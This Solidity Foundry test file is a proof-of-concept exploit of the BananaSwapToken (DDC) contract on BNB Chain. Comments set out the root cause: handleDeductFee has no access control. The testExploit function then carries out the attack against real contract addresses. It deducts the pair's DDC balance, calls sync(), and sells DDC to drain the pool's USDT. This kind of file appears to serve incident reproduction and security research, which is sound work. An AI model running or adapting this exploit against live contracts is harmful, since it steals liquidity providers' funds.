pragma solidity ^0.8.10;

import "forge-std/Test.sol";
//import "./../interface.sol";

interface CheatCodes {
    function createSelectFork(string calldata, uint256) external returns (uint256);
}

interface IERC20 {
    function balanceOf(
        address owner
    ) external view returns (uint256);
    function approve(address spender, uint256 value) external returns (bool);
    function transfer(address to, uint256 value) external returns (bool);
}

interface ITokenAFeeHandler is IERC20 {
    function handleDeductFee(uint8 actionType, uint256 feeAmount, address from, address user) external;
}

interface IRouter {
    function swapExactTokensForTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;
    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;
}

interface IPair {
    function sync() external;
}

// VULNERABILITY: Unauthenticated arbitrary-from fee deduction in BananaSwapToken (DDC)
// Root cause: `handleDeductFee` (and internal `distributeFee`) is declared `external` with ZERO access control or caller validation.
//   See vulnerable source: sources/BananaSwapToken_443195/contracts_banana_BananaSwapToken.sol:228
//     function handleDeductFee(ActionType actionType, uint256 feeAmount, address from, address user) external override {
//         distributeFee(actionType, feeAmount, from, user);
//     }
//   And:
//     function distributeFee(ActionType actionType, uint feeAmount, address from, address user) internal {
//         _balances[from] = _balances[from].sub(feeAmount);  // <-- directly mutates ANY holder's balance
//         ... iterates configMaps[actionType].rewardTypeSet and credits configured feeHandlers ...
//         // NO require(msg.sender == owner or from or manager); anyone can invoke.
//   Legitimate calls are only self-calls from within token logic:
//     - _transferFrom: this.handleDeductFee(ActionType.Transfer, fee, msg.sender, msg.sender);  (line ~417)
//     - _transferFromFee (used by router for buy/sell): this.handleDeductFee(actionType, feeAmount, from, user);  (line ~481)
//   The 'from' parameter is trusted to be the actual sender of a fee-triggering operation, but is attacker-controlled here.
//   This is exacerbated because:
//     * BananaSwapToken is a fee-on-transfer token with complex ActionType-based fee routing (Buy/Sell/Transfer/etc.)
//     * LP pair holds DDC balance which == the AMM reserve for that side (standard for V2-style pairs).
//     * Pair contract never "authorizes" fee deduction; balance is directly mutated.
//   Why it works: direct storage write to _balances[pair] drains the token side of the DDC/USDT pair without touching USDT side or requiring approvals.
//   Then pair.sync() (IPair:40) adopts the new (drained) balanceOf(pair) as reserve, collapsing the constant-product invariant (x*y=k).
//   Impact: Attacker with tiny capital can force the sell of DDC into a pair whose DDC-reserve is ~0 while USDT-reserve is full, extracting virtually 100% of the USDT liquidity from the pool.
//     LPs lose their USDT; attacker converts ~0.1 BNB seed into the entire pool's USDT. No flashloan needed.
//   (Note: actionType=0/Buy is used in PoC even though pair didn't perform a "buy"; the function ignores authorization regardless of actionType.)

// EXPLOIT STEPS:
// 1. Fork at the vulnerable block (20840079) and fund attacker contract with 0.1 WBNB (via address(WBNB).call{value:0.1 ether}("") or deal).
// 2. Buy a small amount of DDC to hold for the final sell: approve WBNB to router, swapExactTokensForTokens WBNB->USDT->DDC path, then approve DDC to router. (BuyDDC())
// 3. Snapshot the pair's DDC reserve: uint256 pairReserve = DDC.balanceOf(address(TargetPair)); uint256 amount = pairReserve - 1;
// 4. Invoke the unprotected fee handler DIRECTLY on the pair's holdings:
//      DDC.handleDeductFee(0 /*ActionType.Buy*/, amount, address(TargetPair), address(this));
//    This executes distributeFee which does:
//      _balances[pair] -= amount;
//      then allocates portions of 'amount' per the (Buy) fee config's ratios to feeHandlers (or effectively removes if ratios 0).
//    Result: pair's DDC balance drops to 1 wei; tokens are now in fee handlers or gone from total effective supply in pair.
// 5. Force the AMM to observe the manipulated balance: TargetPair.sync();
//    Inside the pair (UniswapV2-like): _update(DDC.balanceOf(pair), USDT.balanceOf(pair), oldR0, oldR1);
//    Now reserves ≈ (1, full_USDT). Price of DDC = full_USDT / 1 → astronomically high.
// 6. Sell the attacker's entire DDC balance into the poisoned pool:
//      address[] path = [DDC, USDT]; router.swapExactTokensForTokens(DDC.balanceOf(this), 0, path, this, ...);
//    Because input is DDC (increasing the near-zero side) and output computed against the still-high USDT reserve, the math yields nearly the entire USDT reserve as output.
// 7. Attacker's USDT balance skyrockets; the pair is drained. (See testExploit() lines 58-66 for the exact sequence.)

contract ContractTest is Test {
    IERC20 WBNB = IERC20(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c);
    IRouter TargetRouter = IRouter(0x22Dc25866BB53c52BAfA6cB80570FC83FC7dd125);
    IERC20 USDT = IERC20(0x55d398326f99059fF775485246999027B3197955);
    ITokenAFeeHandler DDC = ITokenAFeeHandler(0x443195AA3a4357242a7427Fc8ce5f20c1E71fcB1);
    IPair TargetPair = IPair(0x4EFdcabA42cC31cF5198ec99BDC025aff1e32Bb0);
    CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);

    function setUp() public {
        cheats.createSelectFork("http://127.0.0.1:8546", 20_840_079);
    }

    function testExploit() external {
        emit log_named_decimal_uint("[Start] Attacker USDT balance before exploit", USDT.balanceOf(address(this)), 18);

        address(WBNB).call{value: 0.1 ether}("");
        BuyDDC();
        uint256 pairReserve = DDC.balanceOf(address(TargetPair));
        uint256 amount = pairReserve - 1;
        // VULN TRIGGER: unauthenticated handleDeductFee with attacker-chosen `from=pair`
        // See detailed VULNERABILITY block at top of file. This line directly mutates
        // _balances[pair] inside the token (no pair code involved).
        DDC.handleDeductFee(0, amount, address(TargetPair), address(this));
        TargetPair.sync();
        SellDDC();

        emit log_named_decimal_uint("[End] Attacker USDT balance after exploit", USDT.balanceOf(address(this)), 18);
    }

    function BuyDDC() public {
        WBNB.approve(address(TargetRouter), ~uint256(0));
        address[] memory path = new address[](3);
        path[0] = address(WBNB);
        path[1] = address(USDT);
        path[2] = address(DDC);
        TargetRouter.swapExactTokensForTokens(WBNB.balanceOf(address(this)), 0, path, address(this), block.timestamp);
        DDC.approve(address(TargetRouter), ~uint256(0));
    }

    function SellDDC() public {
        address[] memory path = new address[](2);
        path[0] = address(DDC);
        path[1] = address(USDT);
        TargetRouter.swapExactTokensForTokens(DDC.balanceOf(address(this)), 0, path, address(this), block.timestamp);
    }
}
